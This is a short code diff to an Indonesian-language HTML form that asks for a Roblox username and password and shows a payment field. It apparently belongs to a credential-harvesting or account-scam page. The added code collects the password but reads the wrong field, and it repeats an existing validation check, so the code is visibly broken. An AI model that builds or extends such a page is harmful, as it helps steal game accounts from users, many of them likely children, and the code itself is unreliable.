@@ -25,7 +25,7 @@
   <input type="text" id="username" placeholder="Username Roblox"
     style="width:100%;padding:8px;margin-top:8px">
   
-  <input type="text" id="password" placeholder="Password kamuu"
+  <input type="text" id="password" placeholder="Password kamu"
     style="width:100%;padding:8px;margin-top:8px">
 
 
@@ -46,7 +46,12 @@
 <script>
 function submit(){
   const username = document.getElementById("username").value;
+  const password = document.getElementById("username").value;
 
+  if(username === ""){
+    alert("Username Roblox wajib diisi!");
+    return;
+  }
   if(username === ""){
     alert("Username Roblox wajib diisi!");
     return;
@@ -76,6 +81,7 @@ Pembayaran      : ${localStorage.getItem("payment")}`;
 
 </body>
 </html>
+
 
 
 
